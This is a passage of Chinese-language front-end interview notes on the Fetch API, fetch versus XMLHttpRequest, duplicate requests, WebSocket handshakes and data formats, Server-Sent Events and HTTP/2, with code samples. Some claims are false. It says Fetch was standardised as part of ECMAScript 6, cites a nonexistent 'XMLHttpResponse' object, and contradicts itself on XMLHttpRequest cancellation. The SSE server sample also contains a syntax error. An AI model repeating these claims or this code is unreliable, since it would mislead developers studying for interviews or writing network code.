Fetch API 是一种用于在浏览器中进行网络请求的新的 API。它基于 Promise，提供了更简单、更强大的方式来进行异步网络请求。

**背景**

1. **起初提案**：Fetch API 最早是由 WHATWG 提出的，旨在改进和取代 XMLHttpRequest，以提供更强大、现代和一致的方式进行网络请求。
2. **标准草案**：Fetch API 在 2015 年被标准化为 ECMAScript 6（ES6）的一部分。这意味着它成为了浏览器和 Node.js 环境中的标准 API。
3. **W3C 标准化**：Fetch API 在 2016 年被 W3C 标准化为 Fetch Standard。这意味着它成为了 Web 平台的一个重要组成部分，得到了广泛的支持和 adoption。

**调用方法**

```javascript
fetch("https://api.example.com/data") // 发送GET请求
  .then((response) => {
    if (!response.ok) {
      throw new Error("请求失败，状态码：" + response.status);
    }
    return response.json(); // 解析响应为JSON
  })
  .then((data) => {
    // 这里处理从服务器返回的数据
    console.log(data);
  })
  .catch((error) => {
    // 处理任何网络请求错误
    console.error("网络请求错误：" + error);
  });

fetch("https://api.example.com/data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Authorization: "Bearer " + token,
  },
  body: JSON.stringify({ key: "value" }), //将数据发送给服务器
})
  .then((response) => {
    if (!response.ok) {
      throw new Error("请求失败，状态码：" + response.status);
    }
    return response.json(); // 解析响应为JSON
  })
  .then((data) => {
    // 这里处理从服务器返回的数据
    console.log(data);
  })
  .catch((error) => {
    // 处理任何网络请求错误
    console.error("网络请求错误：" + error);
  });
```

## 29. 问题：fetch 与 XMLHttpRequest 的区别

- **API 设计**
  - XMLHttpRequest 是早期的技术，它使用回调函数来处理请求和响应，使其代码结构相对复杂。
  - Fetch API 基于 Promise 的 API，更现代、直观和易于使用。它支持使用`async/await`来处理异步操作，使代码更清晰。
- **语法**
  - XMLHttpRequest 使用了一种事件驱动的编程模型，通过设置回调函数来处理请求的各个阶段，如`onload`,`onerror`,`onreadystatechange`等。
  - Fetch API 使用 Promise 对象，通过链式的`.then()`和`catch()`方法来处理请求和响应，更容易理解和维护。
- **请求和响应**
  - XMLHttpRequest 使用单独的对象来表示请求和响应，你需要分别创建`XMLHttpRequest`对象和`XMLHttpResponse`对象来发送请求和处理响应。
  - Fetch API 使用`Request`和`Response`对象，更一致和易于操作，这两种对象都遵循同样的标准。
- **跨域请求**
  - XMLHttpRequest 需要在服务器端进行额外的配置来处理跨域请求，而且在某些情况下，需要使用 JSONP 等技巧来绕过同源策略。
  - Fetch API 默认支持跨域请求，可以通过 CORS 头部来控制跨域访问。
- **错误处理**
  - XMLHttpRequest 的错误处理通常涉及检查`status`和`readyState`属性，以及使用回调函数来处理错误情况
  - Fetch API 使用 Promise 链中的`.catch()`方法来处理错误，这使错误处理更一致和清晰
- **取消请求**
  - XMLHttpRequest 不提供原生的取消请求的机制，但你可以通过设置`abort()`方法来取消请求。
  - Fetch API 提供了`AbortController`和`AbortSignal`对象来取消请求。

## 30. 问题：请求会发送 2 次的原因

1. **Preflight Request(CORS)**:跨源资源共享（CORS）是一种安全机制，用于控制在不同源（域名、协议、端口）之间的资源请求。当你通过 Fetch API 向另一个域名发出跨源请求时，浏览器会自动进行 CORS 预检请求（Preflight Request）。这是为了确定服务器是否接受跨源请求，以及哪些 HTTP 方法和头部字段是允许的。预检请求是一个 OPTIONS 请求，这意味着你的浏览器首先发送一个 OPTIONS 请求，然后才发送实际的 GET 或 POST 请求，因此会看到两个请求。
2. **Redirects(重定向)**：如果服务器返回一个 HTTP 重定向响应（例如，状态码为 302 或 307），浏览器将首先向新的重定向目标 URL 发送一个请求，然后才会继续原始请求。这也可能导致看到两个请求，一个是重定向请求，另一个是最终目标请求。
3. **程序错误会重复调用**：在你的 JavaScript 代码中，有时会发生意外的重复调用 fetch API 的情况，例如在某个事件处理程序中多次触发 Fetch 请求，这就导致多个请求被发送。
4. **浏览器预加载和预解析**：现代浏览器为了提高页面加载速度，会在渲染 HTML 文档时，并行地加载和解析资源（如脚本、样式表、图像等）。这包括预加载和预解析。预加载会提前请求资源，而预解析会在解析 HTML 文档时，并行地加载和解析资源。这可能导致在你发送 Fetch 请求时，浏览器已经开始预加载和预解析相关资源，因此会看到额外的请求。
5. **浏览器插件或扩展**：有时，浏览器插件或扩展可能会触发 Fetch 请求。这可能导致你看到不同于你的网站代码多发出的请求。

## 31. 问题：websocket

webSocket 是在应用层实现的协议。尽管 WebSocket 的握手过程使用了 HTTP 协议，但一旦握手成功，WenSocket 连接会升级为全双工的通信通道，不再遵循 HTTP 协议的规则。在握手成功后，WebSocket 协议会在应用层上定义消息格式和通信规则，通过 TCP 协议在传输层上进行数据传输。

因此，WebSocket 是在应用层实现的协议，他建立在传输层的 TCP 协议之上，使用 HTTP 协议进行握手，然后在建立的 TCP 连接上实现全双工的通信。在应用层上，websocket 定义了一种标准的消息格式和通行规则，使得客户端和服务器可以通过发送和接受 websocket 消息来进行实时的双向通信。

**客户端**

```javascript
const socket = new WebSocket("ws://localhost:8080");

socket.onopen = function (event) {
  console.log("WebSocket连接已打开");

  // 发送消息给服务器
  socket.send("hello Server");
};

socket.onmessage = function (event) {
  console.log("收到服务器消息：" + event.data);
};

socket.onerror = function (event) {
  console.error("WebSocket错误：" + event);
};

socket.onclose = function (event) {
  console.log("WebSocket连接已关闭");
};
```

**服务端**

```javascript
const WebSocket = require("ws");
const wss = new WebSocket.Server({ port: 8080 });

wss.on("connection", function connection(ws) {
  console.log("websocket连接已建立");
  ws.on("message", function incoming(message) {
    console.log("收到客户端消息：" + message);
    // 回复客户端
    ws.send("你好，客户端！");
  });
  ws.on("close", function close() {
    console.log("连接已关闭");
  });
});
```

## 32. 问题：websocket 建立连接的过程

1. **客户端发起 HTTP 握手请求**：客户端首先向服务器发起一个标准的 HTTP 请求，这个请求包含了一些特定的头部，用于请求建立 websocket 连接。

```javascript
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Origin: http://example.com
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
```

- `GET/chat HTTP/1.1`:请求的路径和协议版本
- `Host: server.example.com`:指定服务器的主机名和端口号
- `Upgrade: websocket`:表示客户端希望升级到 websocket 协议
- `Connection: Upgrade`:表示连接将被升级到新的协议
- `Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==`:Base64 编码的随机密钥。服务器用于生成响应中的`Sec-WebSocket-Accept`头部，用于验证服务器是否支持 websocket 协议。
- `Origin: http://example.com`:指定请求的来源，用于防止跨站请求伪造（CSRF）攻击
- `Sec-WebSocket-Protocol: chat, superchat`:指定客户端支持的 websocket 子协议
- `Sec-WebSocket-Version: 13`:指定 websocket 协议的版本号

2. **服务器响应 HTTP 握手请求** 如果服务器支持 WebSocket 并同意升级连接，则会返回一个 101 Switching Protocols 状态码的响应，表示协议切换成功。

```javascript
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: chat
```

- `HTTP/1.1 101 Switching Protocols`:响应的状态码和协议版本
- `Upgrade: websocket`:表示服务器同意升级到 websocket 协议
- `Connection: Upgrade`:表示连接将被升级到新的协议
- `Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=`：服务器基于客户端提供的`Sec-WebSocket-Key`头部计算得到的 Base64 编码的响应密钥，确保握手安全。
- `Sec-WebSocket-Protocol: chat`：服务器确认使用的 websocket 子协议。

3. **WebSocket 连接建立**：
   在服务器响应成功后，客户端和服务器之间的 HTTP 连接就升级为 WebSocket 连接，从此可以进行全双工的实时通信。此时，HTTP 头部已经不再使用，取而代之的是 WebSocket 数据帧。

4. **连接关闭**：WebSocket 连接可以由客服端或服务器任意一方关闭。关闭连接时，发送一个控制帧表示关闭请求，连接将以有序的方式关闭。

## 33. 问题：websocket 支持传输的数据格式

1. **文本数据（Text Data）**：UTF-8 编码的字符串形式传输的。

```javascript
const socket = new WebSocket("ws://localhost:8080");

// 连接打开时发送文本消息
socket.onopen = function (event) {
  console.log("WebSocket连接已打开");

  // 发送消息给服务器
  socket.send("hello Server");
};

// 接受文本消息
socket.onmessage = function (event) {
  console.log("收到服务器消息：" + event.data);
};
```

2. **二进制数据（Binary Data）**：二进制数据可以有多种形式，包括`ArrayBuffer`和`Blob`（在浏览器环境中）。可用于传输复杂的二进制数据，如图片、音频、视频等。

```javascript
const socket = new WebSocket("ws://localhost:8080");

// 发送二进制数据
socket.onopen = function (event) {
  const buffer = new ArrayBuffer(8);
  const view = new Uint8Array(buffer);
  view[0] = 255; // 示例数据
  socket.send(buffer);
};

// 接收二进制数据
socket.onmessage = function (event) {
  if (event.data instanceof ArrayBuffer) {
    const view = new Uint8Array(event.data);
    console.log("收到二进制数据：", view);
  }
};
```

## 34. 问题：Server-Sent Events(SSE)

服务器向浏览器推送实时更新数据的技术。通过使用标准 HTTP 协议和一个持久的连接将事件数据从服务器发送到客服端。适用于需要在客户端实时显示来自服务器的更新信息的应用场景，如实时通知、新闻推送、股票加个更新等。

**主要特点**

1. **单向通信**：服务器可以向客户端推送数据，但客户端不能通过同一连接发送数据回服务器。
2. **基于 HTTP**：SSE 使用 HTTP 协议
3. **自动重连**：如果连接断开，浏览器回自动尝试重新连接。

**工作原理**

1. **服务器端**：服务器通过 HTTP 响应头`Content-Type:text/event-stream`明确这是一个事件流。
2. **客户端**：客户端创建一个`Eventsource`对象，监听来在服务器的事件，并根据接收到的数据更新 UI。

**适用场景**

- **实时通知**：如聊天消息，系统通知等
- **实时更新**：如新闻推送，股票加个更新等
- **数据监控**：如服务器状态监控、日志实时显示等

## 35. 问题：Server-Sent Events(SSE)示例代码

**服务器代码**

```javascript
const http = require('http')

http.createServer((req, res) => {
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    });
    // 发送事件数据
    setInterval(() => {
        res.write('data: Hello World!\n\n');
    }, 1000);
}).listen(8080,()={
    console.log('Server is running on port 8080');
});
```

**客户端代码**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body>
    <button id="start">Start SEE</button>
    <button id="stop">Stop SEE</button>
    <div id="message"></div>

    <script>
      let eventSource;
      document.getElementById("start").addEventListener("click", () => {
        eventSource = new EventSource("http://localhost:8080");
        eventSource.onmessage = (event) => {
          document.getElementById(
            "message"
          ).innerHTML += `<p>${event.data}</p>`;
        };

        eventSource.onopen = (event) => {
          console.log("EventSource connection opened");
        };
        eventSource.onerror = (error) => {
          console.error("EventSource error:", error);
        };
      });

      document.getElementById("stop").addEventListener("click", () => {
        if (eventSource) {
          eventSource.close();
          console.log("EventSource connection closed");
        }
      });
    </script>
  </body>
</html>
```

## 36. 问题：SSE 与 websocket 的区别

**Server-Sent Events(SSE)**

1. **单向通信**：SSE 是单向通信，服务器可以向客户端推送数据，但客户端不能通过同一连接发送数据回服务器。
2. **基于 HTTP 协议**：SSE 使用 HTTP 协议，特别是 HTTP/1.1 的事件流（Event Stream）格式。
3. **连续保持**：SSE 也保持一个持久化的连接，但他是基于 HTTP 协议的，适合需要从服务器向客户端推送实时更新的应用，如新闻推送、实时股票价格等。
4. **数据格式**：SSE 只能发送文本数据，且是以事件流的形式发送。
5. **简单性**：SSE 的实现较为简单，只需要服务器不断发送事件数据到客户端。

**WebSocket**

1. **双向通信**：WebSocket 允许双向通信。服务器和客户端可以通过同一连接发送和接收数据。
2. **协议**：WebSocket 是一个独立的协议，从 HTTP 协议开始，但一旦连接建立，就切换到 websocket 协议。
3. **连接保持**：WebSocket 建立的是一个持久化的连接，适合需要频繁交换数据的应用，如在线聊天，实时游戏。
4. **数据格式**：WebSocket 可以发送和接收任意格式的数据（二进制数据、文本数据等），而 SSE 只能发送文本数据。
5. **复杂度**：WebSocket 的实现相对复杂，需要处理连接的建立、保持和关闭等过程、数据帧格式等。

**选型**

- SSE 更适合单向数据流、需要实时更新的场景，如实时通知系统、社交媒体更新、新闻推送等
- WebSocket 更适合需要双向通信、高频率数据交换的场景，如实时聊天应用、多人在线游戏等

## 37. 问题：http2.0

- **多路复用（Multiplexing）**:HTTP/2 允许在单个连接上同时发送多个请求和响应，而不需要等待一个请求的响应才能发送下一个请求。这显著提高了数据传输的效率，减少了延迟，尤其对于复杂的网页来说效果明显。
- **头部压缩（Header Compression）**：HTTP/2 使用 HPACK 算法压缩 HTTP 头，减少了头信息的大小，提高了传输效率，尤其是在移动网络和高延迟网络上。
- **服务器推送（Server Push）**：HTTP/2 允许服务器在客户端请求资源的同时，主动推送其他资源到客户端。这可以减少客户端请求的数量，提高页面加载速度。
- **二进制协议**：HTTP/2 使用二进制格式传输数据，而不是之前的文本格式。这使得数据传输更加紧凑，提高了效率。
- **流控制（Flow Control）**：HTTP/2 引入了流控制机制，允许服务器和客户端在发送数据时进行流量控制。这可以防止网络拥塞，确保数据传输的稳定性。
- **优先级（Priority）**：HTTP/2 允许为每个流分配优先级，这意味着重要的资源可以优先被传输。这对于需要同时加载多个资源的应用（如网页）尤为重要。
- **安全性**：HTTP/2 支持 TLS/SSL 加密，确保数据在传输过程中的安全性。
